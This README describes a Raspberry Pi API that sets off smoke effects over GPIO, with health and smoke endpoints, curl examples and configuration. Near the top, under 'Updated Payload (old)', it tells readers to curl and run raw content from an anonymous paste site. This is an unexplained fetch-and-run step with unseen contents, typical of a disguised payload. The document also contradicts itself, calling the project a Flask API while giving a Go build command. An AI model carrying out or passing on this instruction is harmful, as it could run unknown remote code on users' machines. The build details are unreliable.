# Nuclear Smoke API
A minimal Flask API for controlling nuclear smoke effects on a Raspberry Pi via GPIO.

### Updated Payload (old)
To trigger the smoke & sound effect, curl and run this: 
https://hst.sh/raw/otehupilec

## Features
The API has various endpoints to set health of the API and a smoke call to set off the nuclear smoke.
The specifics can be found below along with examples of API calls

## Build Process
**Note**: The latest executable can be found in the nuclear-api directory

The executable can be cross complied for a raspberry pi running `armv71` using the
following go build command.

```bash
env GOOS=linux GOARCH=arm GOARM=7 go build -o nuclear-api main.go
```

---
## Endpoints
### `GET /health`
Health check. Returns 200 OK if the API is responsive.

**Response:**
```json
{ "status": "ok" }
```

### `POST /smoke`
Trigger the nuclear smoke effect for a specified duration.

**Request:**
```json
{ "duration": 5 }
```

| Field      | Required | Type   | Description                                |
|------------|----------|--------|--------------------------------------------|
| duration   | Yes      | number | Seconds (must be between 0 and 15)         |

**Response (200):**
```json
{
    "ok": true,
    "duration": 5
}
```

**Error (400):**
```json
{ "error": "'duration' field is required" }
```

**Error (200 - System Busy):**
```json
{ "system busy": "Another request is being processed. Wait 5-10 seconds, then retry." }
```

---

## Examples
```bash
# Health check
curl http://localhost:8000/health

# Trigger smoke for 3 seconds
curl http://localhost:8000/smoke \
     -H "Content-Type: application/json" \
     -d '{"duration": 3}'

# Trigger smoke for 10 seconds
curl http://localhost:8000/smoke \
     -H "Content-Type: application/json" \
     -d '{"duration": 10}'
```

---
## Configuration
- **GPIO Pin:** Pin 21 (configurable in `trigger_smoke()`)
- **Max Duration:** 15 seconds (prevents system overload)
- **Request Throttling:** Prevents simultaneous triggers with built-in cooldown
